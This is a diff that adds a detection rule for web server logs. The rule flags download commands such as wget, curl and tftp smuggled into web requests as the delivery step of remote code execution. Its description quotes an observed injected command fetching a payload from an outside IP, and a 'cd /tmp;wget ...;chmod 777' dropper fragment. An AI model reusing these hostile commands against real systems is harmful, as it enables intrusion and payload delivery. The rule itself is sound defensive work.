@@ -1,0 +1,85 @@
+title: Download command carried in a web request
+id: 9871b78f-208b-486c-8cda-4e4e242c6515
+status: experimental
+description: |
+  A downloader named inside a web request rather than in the client's own
+  User-Agent: wget, curl, tftp or ftpget appearing in the request line, the
+  query string, or a request body the server logged. That is the delivery
+  step of a web RCE - the exploit buys one command, and the command fetches
+  the payload.
+  Two places it shows up, and they mean different things. In the error log it
+  is the request as the server saw it, whether or not the exploit worked -
+  mod_dumpio writes the body, and a malformed request line lands there too.
+  In the access log it is only worth reporting when the server answered 2xx,
+  because a download command sent to an endpoint that 404s is a spray that
+  missed; that is why the access half insists on the status and the error half
+  does not. The status field is only populated on access rows, so the second
+  selection cannot fire on an error row.
+  Wider than the two rules next to it on purpose. web_request_body_pipes_
+  download_to_shell needs the fetch to be piped into an interpreter, and
+  iot_router_command_injection_dropper needs a known router endpoint - so
+  'curl -O http://5.206.227.228/zero' against /cgi-bin/kerbynet matches
+  neither, and on the host this was written against that is exactly what
+  arrived. This rule asks only whether a download was requested at all.
+  Eleven of the rows it reports on that host are also reported by
+  web_server_executed_a_downloader, which is deliberate and is the same
+  tiering used elsewhere here - this rule says a download was named,
+  that one says it ran. Read together, the second answers the question
+  the first raises.
+author: linsight
+date: 2026-08-26
+logsource:
+  product: linux
+  category: webserver
+detection:
+  # A trailing space, '+' or '%20' is what separates the command from its
+  # arguments, and it is also what keeps 'User-Agent: curl/7.54.0' out: the
+  # client naming itself writes 'curl/', never 'curl '. 269 User-Agent lines
+  # on this host say curl and none of them are a download.
+  logged:
+    message|contains:
+      - 'wget '
+      - 'curl '
+      - 'tftp '
+      - 'ftpget '
+      - 'lwp-download'
+      - 'aria2c '
+  requested:
+    resource|contains:
+      - 'wget '
+      - 'wget+'
+      - 'wget%20'
+      - 'curl '
+      - 'curl+'
+      - 'curl%20'
+      - 'tftp '
+      - 'tftp+'
+      - 'tftp%20'
+      - 'ftpget'
+      - 'lwp-download'
+  answered:
+    status|startswith: '2'
+  condition: logged or (requested and answered)
+fields:
+  - client_ip
+  - method
+  - resource
+  - status
+  - user_agent
+  - message
+falsepositives:
+  - >-
+    A page or API that legitimately takes a URL and fetches it server-side, a
+    link previewer, a webhook tester, an RSS reader. Read the resource. A
+    parameter named 'url' holding one address is that; a parameter holding
+    'cd /tmp;wget ...;chmod 777' is not.
+  - >-
+    Documentation, a package index or a paste site serving a page that quotes
+    an install line. These answer 2xx by design, so read what was requested
+    rather than the status alone.
+level: high
+tags:
+  - attack.execution
+  - attack.t1059.004
+  - attack.command_and_control
+  - attack.t1105
